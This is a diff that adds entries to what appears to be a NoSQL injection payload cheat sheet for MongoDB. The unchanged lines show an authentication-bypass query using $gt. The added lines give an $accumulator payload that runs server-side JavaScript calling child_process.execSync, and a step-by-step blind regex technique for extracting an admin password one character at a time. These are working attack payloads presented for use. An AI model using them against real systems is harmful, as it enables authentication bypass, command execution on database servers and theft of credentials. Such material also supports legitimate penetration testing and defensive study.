@@ -116,6 +116,30 @@ db.users.findOne({ username: {$gt: ""}, password: {$gt: ""} })
 }
 ```
 
+### [NEW] MongoDB 4.4+ — `$accumulator` and `$function`
+**How it works:** These are modern operators that allow JS execution in aggregation pipelines.
+
+**Payload:**
+```json
+{
+  "$accumulator": {
+    "init": "function() { return require('child_process').execSync('id').toString(); }",
+    "accumulateArgs": [],
+     "merge": "function(state, buffer) { return state; }",
+     "finalize": "function(state) { return state; }",
+     "lang": "js"
+  }
+}
+```
+
+---
+
+### [NEW] Blind NoSQLi Data Exfiltration
+*Used when the response only indicates if the user exists.*
+
+1. **Length Discovery:** `{"username": "admin", "password": {"$regex": "^.{20}$"}}` (Try numbers until true).
+2. **Character Discovery:** `{"username": "admin", "password": {"$regex": "^a.*"}}` (Try a-z, 0-9).
+
 ---
 
 ### Injection via Query String (GET parameters)
